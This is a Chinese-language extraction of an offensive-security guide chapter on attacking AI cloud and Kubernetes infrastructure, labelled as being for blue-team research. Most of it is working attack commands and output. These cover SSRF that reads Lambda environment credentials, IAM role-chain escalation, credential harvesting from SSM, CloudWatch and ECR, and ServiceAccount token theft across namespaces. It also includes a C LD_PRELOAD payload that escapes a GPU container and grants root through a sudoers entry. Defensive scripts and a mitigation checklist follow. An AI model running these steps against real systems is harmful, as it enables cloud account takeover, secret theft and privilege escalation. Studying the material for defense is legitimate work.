# 第 9 章：基础设施与部署攻击 —— 完整提取

> **蓝队安全研究用途**。内容提取自《AI Red 攻防指南》第 9 章原文（PDF 第 129-148 页），含所有攻击方法、命令及 Python 脚本。

---

## 9.0 核心结论

AI 工作负载因为训练、推理、特征访问、模型注册和自动化运维的需要，天然拥有更复杂的权限路径和更宽的资源访问范围。同样一个 SSRF、一个日志泄露、一个 Kubernetes RBAC 过宽——在 AI 场景造成的影响往往更大。

---

## 9.1 云服务错误配置

### 攻击方法 1：SSRF → Lambda 凭证泄露 → IAM 角色链

**初始入口**：患者门户 `/api/export` 端点接受 `template_url` 参数，存在 SSRF 漏洞。

```bash
# Step 1：读取 Lambda 环境变量
kali@kali:~$ curl -s "https://APIGATEWAY_URL/prod/api/export?template_url=file:///proc/self/environ" \
  | jq -r '.report' | tr '\0' '\n' | grep -E \
  '^(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN|BACKEND_ROLE_ARN|SAGEMAKER_ENDPOINT)='

AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEDkaCXVzLWVhc3Qt...
AWS_SECRET_ACCESS_KEY=B11FnI+DGg89kMBh4UF1XmdmZzfO3DqkPzdZ989fH
AWS_ACCESS_KEY_ID=ASIAXYKJJV3XAMCKCAIG
BACKEND_ROLE_ARN=arn:aws:iam::533267328756:role/DataScientistRole
SAGEMAKER_ENDPOINT=sthubbins-pea-endpoint
```

```bash
# Step 2：验证凭证
kali@kali:~$ export AWS_ACCESS_KEY_ID=ASIAXYKJJV3XAMCKCAIG
kali@kali:~$ export AWS_SECRET_ACCESS_KEY=B11FnI+...
kali@kali:~$ export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2Vj...
kali@kali:~$ export AWS_REGION=us-east-1
kali@kali:~$ aws sts get-caller-identity
{
    "Arn": "arn:aws:sts::533267328756:assumed-role/pea-portal-lambda-role/pea-portal-handler"
}
```

**`sts:GetCallerIdentity`** 是验证凭证的可靠方式——不需任何权限就能调用，即使 IAM 策略显式拒绝它也能工作（但会在 CloudTrail 中留痕）。

**SSRF 泄露的关键情报**：

| 变量 | 值 | 攻击价值 |
|------|-----|---------|
| `SAGEMAKER_ENDPOINT` | sthubbins-pea-endpoint | SageMaker 推理端点 |
| `BACKEND_ROLE_ARN` | arn:aws:iam::...DataScientistRole | 可尝试 AssumeRole |
| `DYNAMODB_TABLE` | sthubbins-pea-feedback | DynamoDB 数据访问 |

---

### 攻击方法 2：IAM 角色链提权

**完整提权链（4 层）**：

```
SSRF(Lambda凭证) → DataScientistRole → MLOpsRole → SageMakerExecutionRole(全账户)
```

**第一跳：Assume DataScientistRole**

```bash
kali@kali:~$ aws sts assume-role \
  --role-arn arn:aws:iam::533267328756:role/DataScientistRole \
  --role-session-name "lambda-pea"
# 成功！获取新凭证

# 枚举 DataScientistRole 的策略
kali@kali:~$ aws iam get-role-policy --role-name DataScientistRole \
  --policy-name DataScientistPolicy
# 发现: sts:AssumeRole → MLOpsRole（明显提权路径）
```

**第二跳：Assume MLOpsRole**

```bash
kali@kali:~$ aws sts assume-role \
  --role-arn arn:aws:iam::533267328756:role/MLOpsRole \
  --role-session-name "pea-deploy"
# MLOpsRole: sagemaker:* + iam:PassRole + sts:AssumeRole → SageMakerExecutionRole
```

**第三跳：Assume SageMakerExecutionRole**

```bash
kali@kali:~$ aws sts assume-role \
  --role-arn arn:aws:iam::533267328756:role/SageMakerExecutionRole \
  --role-session-name "training-run"

# SageMakerExecutionRole → 附加了 AmazonSageMakerFullAccess
# 授予 sagemaker:* 以及对 S3、ECR、CloudWatch、EC2、Lambda 的广泛访问
kali@kali:~$ aws s3 ls  # → 全账户 S3 bucket 可访问
```

**关键教训**：每一步授予更多权限，终点是一个打破所有项目边界的 AWS 托管策略。

**Python 脚本 —— IAM 角色链自动化枚举**：

```python
"""
IAM 角色链枚举脚本
蓝队自测：验证角色是否可被跨层 Assume
"""

import boto3
import json

def enumerate_role_chain(start_role_name: str) -> list:
    """从起始角色出发，枚举完整的 AssumeRole 链"""
    iam = boto3.client('iam')
    chain = [start_role_name]
    visited = {start_role_name}

    current = start_role_name
    while True:
        policies = iam.list_role_policies(RoleName=current)['PolicyNames']
        found_next = False
        for p_name in policies:
            policy = iam.get_role_policy(RoleName=current, PolicyName=p_name)
            for stmt in policy['PolicyDocument'].get('Statement', []):
                if stmt.get('Action') == 'sts:AssumeRole':
                    target_arn = stmt.get('Resource', '')
                    target_role = target_arn.split('/')[-1]
                    if target_role not in visited:
                        chain.append(target_role)
                        visited.add(target_role)
                        current = target_role
                        found_next = True
                        break
            if found_next:
                break
        if not found_next:
            break

    return chain


# 验证每个角色的权限边界
def check_trust_policy(role_name: str) -> str:
    """检查角色的信任策略——谁能 assume 它"""
    iam = boto3.client('iam')
    role = iam.get_role(RoleName=role_name)
    trust = role['Role']['AssumeRolePolicyDocument']
    for stmt in trust.get('Statement', []):
        if 'AWS' in stmt.get('Principal', {}):
            principal = stmt['Principal']['AWS']
            if principal.endswith(':root'):
                return f"WARNING: 账户内任何人都可 assume {role_name}"
    return "OK"
```

---

### 攻击方法 3：凭证狩猎（多来源系统性收集）

**来源 1：Secrets Manager**

```bash
aws secretsmanager list-secrets --query "SecretList[*].[Name,Description,Tags]" --output json
# → megacorpone/devops/jenkins-deploy-xxx（Jenkins CI/CD token）
# 但 GetSecretValue 被 IAM 条件限定 → 只能记录待后续利用
```

**来源 2：SSM Parameter Store**（明文存储重灾区）

```bash
aws ssm describe-parameters --query "Parameters[*].[Name,Type,Description]" --output json
# → String 类型而非 SecureString，无需 KMS 解密

aws ssm get-parameters-by-path \
  --path "/megacorpone/sthubbins/prod/" --recursive --with-decryption
# → "postgresql://mluser:Pr0edP@ssw0rd2024!@features-db.megacorpone.ai:5432/..."

# 版本历史可能泄露旧密码
aws ssm get-parameter-history \
  --name "/megacorpone/sthubbins/prod/database-url" --with-decryption
# → Version 1: InitialP@ss2023  → Version 2: Pr0edP@ssw0rd2024!
```

**来源 3：CloudWatch Logs**

```bash
aws logs get-log-events \
  --log-group-name "/aws/sagemaker/training/sthubbins-pea" \
  --log-stream-name "train-sthubbins-pea-v1-20240115" \
  --query "events[*].message" --output text
# → [DEBUG] Initializing OpenAI embeddings client with key: sk-proj-FAKE123...
# → [ERROR] Connection timeout... [DEBUG] AWS_ACCESS_KEY_ID=AKIA...
# 失败运行的日志尤其危险：开发者倾向于忽略，日志条目永久保留
```

**来源 4：SageMaker Model Registry**

```bash
aws sagemaker describe-model-package \
  --model-package-name arn:aws:sagemaker:us-east-1:...  \
  --query "{Containers:InferenceSpecification.Containers[0], Metadata:CustomerMetadataProperties}"
# → 容器环境变量: MODEL_REGISTRY_TOKEN = "mr-tok-FAKE987..."
# → 元数据: CloudWatch 训练作业名、S3 路径、ECR 镜像 URI
```

**来源 5：ECR 镜像环境变量**

```bash
aws ecr get-login-password --region us-east-1 | \
  docker login --username AWS --password-stdin 533267328756.dkr.ecr.us-east-1.amazonaws.com

docker pull 533267328756.dkr.ecr.us-east-1.amazonaws.com/megacorpone-sthubbins-training:latest
docker inspect --format '{{json .Config.Env}}' ... | jq -r '.[]'
# → DATABASE_URL=postgresql://mluser:...
# → FEATURE_STORE_API_KEY=fs-api-key-...
# → AWS_ACCESS_KEY_ID=AKIA...
```

**凭证汇总**：

| 来源 | 泄露内容 | 利用价值 |
|------|---------|---------|
| CloudWatch 失败日志 | AWS 临时凭证 | 可能已过期，需验证 |
| CloudWatch 成功日志 | OpenAI API 密钥 | 直接成本滥用/数据外泄 |
| SSM Parameter Store | 数据库 URL + 密码 | 网络可达时横向移动 |
| Model Registry | MODEL_REGISTRY_TOKEN | 内部注册表访问 |
| ECR 镜像 | DB URL、API 密钥、AWS 凭证 | 直接利用 |

---

### 攻击方法 4：暴露的推理端点发现

```bash
# 枚举所有运行中实例
aws ec2 describe-instances \
  --filters "Name=instance-state-name,Values=running" \
  --query "Reservations[*].Instances[*].{ID:InstanceId,PublicIP:PublicIpAddress,SG:SecurityGroups[0].GroupName}" --output json

# → 发现客户项目 GPU 实例，端口 8000 vLLM API 暴露给 0.0.0.0/0
curl -s http://54.210.123.45:8000/v1/models | jq .
# {"data":[{"id":"Qwen/Qwen2.5-7B-Instruct-AWQ"}]}

curl -s http://54.210.123.45:8000/version | jq .
# {"version":"0.7.3"}
# → 精确版本号 → 搜索已知 CVE
```

**影响**：任何互联网用户无需凭证即可查询模型 → 资源滥用、模型提取、逆向评分标准。

---

## 9.2 容器与编排攻击

### 攻击方法 5：Kubernetes 初始访问与枚举

**场景**：通过鱼叉式钓鱼获得平台工程师工作站的 SSH 访问。

**恢复 kubeconfig**：

```bash
aisha@workstation:~$ kubectl config view --raw
# clusters: server: https://cp-01:6443
# user: aisha-kone, namespace: app

# 解析证书获取组织信息
aisha@workstation:~$ kubectl config view --raw \
  -o jsonpath='{.users[0].user.client-certificate-data}' | \
  base64 -d | openssl x509 -text -noout | grep Subject
# Subject: O = megacorpone:av-platform-ops, CN = aisha-kone
```

**bash history 侦察**：

```bash
aisha@workstation:~$ cat ~/.bash_history
# ssh sanjay@cp-01 "kubectl get nodes"                    ← SSH 访问控制平面
# kubectl get pods -n ml-inference
# kubectl exec -it inference-pod -n ml-inference -- curl localhost:8080/health
# kubectl exec -it inference-pod -n ml-inference -- cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
```

**ConfigMap 信息提取**：

```bash
kubectl get configmap app-config -n app -o yaml
# → 推理服务端点、MLflow tracking URI、特征存储端点

kubectl get configmap pipeline-config -n ml-inference -o yaml
# → MinIO artifact store、内部 API URL
```

---

### 攻击方法 6：ServiceAccount 令牌窃取与权限升

**测试当前权限**：

```bash
aisha@workstation:~$ kubectl auth can-i --list -n ml-inference
# → get/list pods、pod logs、create pod exec、get configmaps
# → 不能读 secrets、不能创建 pods → 合理范围的故障排查角色
```

**问题**：pod 内部的 service account 令牌是否有更广泛权限？

```bash
aisha@workstation:~$ kubectl exec -it inference-pod -n ml-inference -- /bin/bash

# 检查默认挂载的 SA 令牌
root@inference-pod:/app# ls /var/run/secrets/kubernetes.io/serviceaccount/
# ca.crt  namespace  token     ← 默认挂载，最常见的横向移动向量

# 用 curl 通过 API server 查询权限
root@inference-pod:/app# export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
root@inference-pod:/app# export APISERVER=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}

root@inference-pod:/app# curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  -H "Authorization: Bearer ${TOKEN}" \
  ${APISERVER}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"ml-inference"}}' \
  | jq '.status.resourceRules[] | select(.resources != null) | {verbs, resources, apiGroups}'
```

**发现**：`inference-sa` 拥有：
- **get/list/watch secrets（跨所有命名空间！）**
- get/list/watch namespaces/pods/services/configmaps/nodes（集群范围资源）
- create/get pods/exec、pods/log

> 权限包含 `nodes` 和 `namespaces` —— 集群范围资源，说明来自 **ClusterRole** 而非命名空间 Role。

---

### 攻击方法 7：身份链式攻击

```bash
# 枚举所有命名空间
root@inference-pod:/app# curl -s ... ${APISERVER}/api/v1/namespaces | jq -r '.items[].metadata.name'
# app, ci-cd, data-engineering, kube-system, ml-inference, monitoring, pipeline-system...

# 跨命名空间读取 secrets
root@inference-pod:/app# curl -s ... ${APISERVER}/api/v1/namespaces/pipeline-system/secrets | \
  jq -r '.items[] | "\(.metadata.name)\t\(.type)"'
# argo-controller-token    kubernetes.io/service-account-token   ← 高价值目标！
# backup-encryption-key    Opaque
# minio-credentials        Opaque
# mlflow-tracking-credentials Opaque
# postgres-credentials     Opaque
```

**窃取 Argo 控制器令牌**：

```bash
root@inference-pod:/app# ARGO_TOKEN=$(curl -s ... \
  ${APISERVER}/api/v1/namespaces/pipeline-system/secrets/argo-controller-token | \
  jq -r '.data.token' | base64 -d)

# 解码 JWT payload
root@inference-pod:/app# echo $ARGO_TOKEN | cut -d. -f2 | base64 -d | jq .
# → "sub":"system:serviceaccount:pipeline-system:argo-workflow-controller"
```

**Argo 权限**：
- create/delete/get/list/watch/patch **pods**、pods/exec
- create/delete/get/list persistentvolumeclaims
- create/delete/get/list **daemonsets**、cronjobs、jobs

**身份能力对比**：

| 能力 | inference-sa | argo-workflow-controller |
|------|-------------|------------------------|
| 读取 secrets（全命名空间） | 是 | 是 |
| exec 进 pods | 是 | 是 |
| **创建/删除 pods** | 否 | **是** |
| **创建 Daemonsets/CronJobs** | 否 | **是** |
| 管理 Argo 工作流 | 否 | 是 |

> 第一个身份"能看到一切但不能行动"，第二个身份"能行动但只能通过第一个身份到达"——两者结合覆盖完整"读→写"提权路径。

**读取 MinIO 凭证**：

```bash
root@inference-pod:/app# curl -s ... ${APISERVER}/api/v1/namespaces/pipeline-system/secrets/minio-credentials | \
  jq '{accesskey: (.data.accesskey | @base64d), secretkey: (.data.secretkey | @base64d)}'
# → accesskey: "ridgeline-artifacts-sa", secretkey: "Ridgeline2024!artifacts"
# → 可下载模型二进制、注入投毒模型、植入后门工件
```

---

### 攻击方法 8：Sidecar 与共享 Volume 攻击

**model-pipeline pod 架构**（4 个容器）：

| 容器 | 端口 | 共享卷 |
|------|------|--------|
| pre-processor | 8081 | request-queue(rw)、logs(rw) |
| inference | 8080 | model-artifacts(ro)、request-queue(rw)、credentials(ro)、logs(rw) |
| post-processor | 8082 | request-queue(rw)、logs(rw) |
| log-collector | — | logs(ro) |

**关键发现**：`request-queue` 卷以 `readonly: false` 挂载到三个容器！

```bash
aisha@workstation:~$ kubectl exec -it model-pipeline -c pre-processor -n ml-inference -- /bin/sh

# 从 sidecar 读取推理请求
$ ls /queue/
# requests
$ cat /queue/requests/req_test-001.json
# → {"tokens":["vehicle","collision","at","highway","intersection"],...}

# 可以从 sidecar:
#  1. 读取所有传入的推理请求（数据外泄）
#  2. 在 inference 读取前修改请求（把 "critical" 换成 "routine" 强制错误分类）
#  3. 注入假请求探测模型行为
#  4. 写入共享日志卷掩盖痕迹
```

**Python 脚本 —— 共享卷漏洞检测**：

```python
"""
Kubernetes 共享卷安全检测
蓝队自测：检查 pod 中是否有 writable 共享卷被多个容器挂载
"""

import subprocess, json

def check_shared_volumes(namespace: str):
    """检查命名空间中所有 pod 的共享卷读写权限"""
    result = subprocess.run(
        ["kubectl", "get", "pods", "-n", namespace, "-o", "json"],
        capture_output=True, text=True
    )
    pods = json.loads(result.stdout)

    for pod in pods.get('items', []):
        containers = pod['spec']['containers']
        if len(containers) < 2:
            continue

        volumes = {}
        for vol in pod['spec'].get('volumes', []):
            volumes[vol['name']] = vol

        for container in containers:
            for mount in container.get('volumeMounts', []):
                vol_name = mount['name']
                is_readonly = mount.get('readOnly', False)
                if not is_readonly:
                    # 检查该卷是否被其他容器挂载
                    other_containers = [
                        c['name'] for c in containers
                        if c['name'] != container['name']
                        and any(m['name'] == vol_name for m in c.get('volumeMounts', []))
                    ]
                    if other_containers:
                        print(f"[!] {pod['metadata']['name']}: "
                              f"{container['name']} → {vol_name}(rw) "
                              f"also mounted by {other_containers}")
```

---

### 攻击方法 9：GPU 容器逃逸（CVE-2025-23266）

**场景**：受限 ML 工程师 `robertj` 可以通过 `sudo` 以 root 运行两个 GPU 构建/运行脚本。

**漏洞组合**：
- `runc < 1.2.6`：用 `setenv()` 设置容器环境变量，污染了 runc 进程自身环境
- NVIDIA Container Toolkit 1.17.0-1.17.7：hook 继承父进程环境

```bash
robertj@ip-172-31-77-16:~$ dpkg-query -W nvidia-container-toolkit
# nvidia-container-toolkit    1.17.7-1
robertj@ip-172-31-77-16:~$ runc --version
# runc version 1.2.0
robertj@ip-172-31-77-16:~$ grep cuda-compat-mode /etc/nvidia-container-runtime/config.toml
# cuda-compat-mode = "hook"
```

**Payload（`cuda_compat_shim.c`）**：

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>

#define SUDOERS "/etc/sudoers.d/cuda-compat-update"

__attribute__((constructor))
static void init(void) {
    unsetenv("LD_PRELOAD");
    FILE *f = fopen(SUDOERS, "w");
    if (f) {
        fprintf(f, "robertj ALL=(ALL) NOPASSWD: ALL\n");
        fclose(f);
        chmod(SUDOERS, 0644);
    }
}
```

**编译与利用**：

```bash
# 编译共享库
robertj@ip-172-31-77-16:~$ gcc -shared -fPIC -nostartfiles \
  -o /tmp/cuda-compat-build/cuda_compat_shim.so cuda_compat_shim.c

# 三行 Dockerfile
FROM busybox
ENV LD_PRELOAD=/proc/self/cwd/cuda_compat_shim.so    ← 关键: runc 继承此环境变量
ADD cuda_compat_shim.so /

# 构建并运行
robertj@ip-172-31-77-16:~$ sudo /opt/ridgeline/tools/gpu-build.sh \
  -t cuda-compat-hotfix -f /tmp/cuda-compat-build/Dockerfile /tmp/cuda-compat-build/
robertj@ip-172-31-77-16:~$ sudo /opt/ridgeline/tools/gpu-run.sh cuda-compat-hotfix echo done

# 验证提权
robertj@ip-172-31-77-16:~$ sudo -l
# → (ALL) NOPASSWD: ALL     ← 成功

robertj@ip-172-31-77-16:~$ sudo -i
root@ip-172-31-77-16:~#
```

**`/proc/self/cwd/` 的关键作用**：toolkit hook 运行时的工作目录是容器 root 文件系统，这个 symlink 在主机上解析到该目录，让动态链接器找到只存在于容器镜像中的 `.so` 文件。

**包装脚本的防御盲区**：脚本检查了 `--privileged`、`--pid=host`、`--cap-add`、`--volume`、`--security-opt` 等运行时标志，但无法阻止 Dockerfile 环境变量在容器创建阶段触发的漏洞。

---

## 9.3 本章小结

| 攻击面 | 关键技术 | 防御启示 |
|--------|---------|---------|
| **SSRF 凭证泄露** | `file:///proc/self/environ` 读 Lambda 环境变量 | 不在 Lambda 环境变量存长期凭证；用 IAM 角色 |
| **IAM 角色链** | sts:AssumeRole 逐层提升 | 每个角色严格限定资源和标签条件；托管策略权限宽泛是危险信号 |
| **S3 数据外泄** | 递归列出 + 版本历史恢复删除文件 | bucket 策略限制跨项目访问；敏感数据加密 |
| **日志凭证泄露** | CloudWatch DEBUG 级别明文密钥 | 禁止日志输出密钥；失败运行日志同审查 |
| **SSM 明文存储** | String 类型 + 版本历史 | 敏感参数用 SecureString；定期清理版本历史 |
| **ECR 镜像硬编码** | docker inspect 提取环境变量 | 构建时避免硬编码；用运行时注入或 secret 挂载 |
| **暴露推理端点** | vLLM API 无认证 + 版本泄露 | 默认启用认证；限制源 IP |
| **K8s SA 令牌窃取** | `/var/run/secrets/.../token` | 不需要 API 访问的 pod 设 `automountServiceAccountToken: false` |
| **ClusterRole 过度授权** | 集群角色绑定到工作负载 SA | 用命名空间 RoleBinding；定期审计 RBAC |
| **身份链式攻击** | inference-sa(读)→Argo(写) | 分离读写权限；监控异常身份切换 |
| **Sidecar 共享卷** | readonly:false 的卷篡改推理数据 | 敏感卷用 readonly:true；sidecar 最小权限 |
| **GPU 容器逃逸** | LD_PRELOAD + runc/toolkit 环境继承 | 及时更新 Toolkit 和 runc；限制非特权用户构建 GPU 镜像 |

### 防御最小集

1. **IAM 角色使用资源条件**：每个角色限定项目的标签或 ARN 路径
2. **凭证永不碰环境变量和日志**：运行时注入、secret 挂载、禁止日志输出
3. **模型端点默认认证**：不假设"内部网络"就安全
4. **K8s 命名空间 RBAC**：而非 ClusterRoleBinding
5. **关闭 automountServiceAccountToken**（不需要 API 访问的 pod）
6. **共享卷设 readonly:true**：sidecar 最小权限
7. **及时更新 GPU 基础设施组件**

---

## 蓝队自测清单

| 检查项 | 风险 | 方法 | 验证 |
|--------|------|------|------|
| Lambda 环境变量是否含长期凭证 | 高 | 方法 1 | 审计 Lambda 配置 |
| IAM 角色是否可跨层 Assume | 高 | 方法 2 | 枚举角色信任链 |
| S3 bucket 是否限制跨项目访问 | 高 | 方法 3 | 用不同角色测试访问 |
| CloudWatch 日志是否含密钥 | 高 | 方法 3 | 扫描日志内容 |
| SSM 参数是否用 SecureString | 高 | 方法 3 | 审计参数类型 |
| ECR 镜像是否硬编码凭证 | 高 | 方法 3 | docker inspect |
| 推理端点是否需要认证 | 高 | 方法 4 | curl 无认证测试 |
| K8s SA 令牌是否默认挂载 | 高 | 方法 5-6 | 检查 pod spec |
| ClusterRole 是否过度授权 | 高 | 方法 6-7 | 审计 RBAC 绑定 |
| 共享卷是否设 readonly | 高 | 方法 8 | 检查 volumeMount 配置 |
| GPU 组件(runc/toolkit)是否最新 | 高 | 方法 9 | dpkg-query 版本检查 |
